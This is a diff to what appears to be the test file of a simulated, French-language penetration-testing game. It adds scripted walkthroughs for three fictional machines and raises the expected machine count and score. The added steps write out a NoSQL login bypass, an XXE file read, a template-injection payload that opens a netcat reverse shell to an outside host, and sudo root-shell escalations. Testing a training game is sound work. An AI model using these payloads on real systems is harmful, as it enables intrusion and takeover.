@@ -183,6 +183,30 @@ const MACHINE_SOLUTIONS = {
     run(ctx, "C:\\Windows\\Temp\\svc.exe");
     return run(ctx, "type root.txt");
   },
+  aether: (ctx) => {
+    run(ctx, "nmap 10.10.11.90");
+    run(ctx, "curl http://10.10.11.90/");
+    run(ctx, "curl http://10.10.11.90/api/docs");
+    run(ctx, "curl -d '{\"user\":\"admin\",\"pass\":{\"$ne\":null}}' http://10.10.11.90/api/login");
+    run(ctx, "ssh tbernard@10.10.11.90");
+    pass(ctx, "Aeth3r_N0sql_Byp4ss!");
+    run(ctx, "cat user.txt");
+    run(ctx, "sudo -l");
+    run(ctx, "sudo taskset 1 /bin/sh");
+    return run(ctx, "cat /root/root.txt");
+  },
+  eclipse: (ctx) => {
+    run(ctx, "exit"); // pour attraper le callback, être sur sa propre box
+    run(ctx, "nmap 10.10.11.195");
+    run(ctx, "curl http://10.10.11.195:8081/");
+    run(ctx, 'curl "http://10.10.11.195:8081/report?name={{7*7}}"');
+    run(ctx, "nc -lvnp 4444");
+    run(ctx, "curl \"http://10.10.11.195:8081/report?name={{ os.popen('nc 10.10.14.1 4444 -e /bin/sh').read() }}\"");
+    run(ctx, "cat user.txt");
+    run(ctx, "sudo -l");
+    run(ctx, "sudo nice /bin/sh");
+    return run(ctx, "cat /root/root.txt");
+  },
   stratus: (ctx) => {
     run(ctx, "nmap 10.10.11.120");
     run(ctx, "curl http://10.10.11.120/");
@@ -218,6 +242,17 @@ const MACHINE_SOLUTIONS = {
     run(ctx, "cat user.txt");
     run(ctx, "sudo -l");
     run(ctx, "sudo perl -e 'exec \"/bin/sh\";'");
+    return run(ctx, "cat /root/root.txt");
+  },
+  vesper: (ctx) => {
+    run(ctx, "nmap 10.10.11.162");
+    run(ctx, "curl http://10.10.11.162:8090/");
+    run(ctx, 'curl -d \'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/vesper/service.conf">]><r>&x;</r>\' http://10.10.11.162:8090/api/import');
+    run(ctx, "ssh kbrennan@10.10.11.162");
+    pass(ctx, "V3sper_XXE_L34k!63");
+    run(ctx, "cat user.txt");
+    run(ctx, "sudo -l");
+    run(ctx, "sudo setsid /bin/sh");
     return run(ctx, "cat /root/root.txt");
   },
   tempest: (ctx) => {
@@ -279,11 +314,11 @@ const MACHINE_SOLUTIONS = {
   },
 };
 
-section("Machines : recon -> accès -> privesc -> flags (les 14 machines)", () => {
+section("Machines : recon -> accès -> privesc -> flags (les 17 machines)", () => {
   const ctx = freshContext();
   unlockAll(ctx);
   const machines = get(ctx, "MACHINES");
-  assertEqual(machines.length, 14, "14 machines définies dans MACHINES");
+  assertEqual(machines.length, 17, "17 machines définies dans MACHINES");
 
   let totalScoreCheck = 0;
   for (const m of machines) {
@@ -298,11 +333,11 @@ section("Machines : recon -> accès -> privesc -> flags (les 14 machines)", () =
   }
 
   const finalScore = get(ctx, "GAME.score");
-  // 14 machines * (100 recon + 150 accès + 250 privesc + 100 userFlag + 200 rootFlag) = 14 * 800 = 11200
-  assertEqual(finalScore, 11200, "score total cohérent après les 14 machines (100+150+250+100+200 par machine)");
+  // 17 machines * (100 recon + 150 accès + 250 privesc + 100 userFlag + 200 rootFlag) = 17 * 800 = 13600
+  assertEqual(finalScore, 13600, "score total cohérent après les 17 machines (100+150+250+100+200 par machine)");
 
   const badges = get(ctx, "GAME.badges");
-  assert(badges["completionist"] === true, "badge 🌐 tour complet débloqué après les 14 machines");
+  assert(badges["completionist"] === true, "badge 🌐 tour complet débloqué après les 17 machines");
 });
 
 section("Lore transversal : note_interne.txt présent sur chaque machine sans fausser le score", () => {
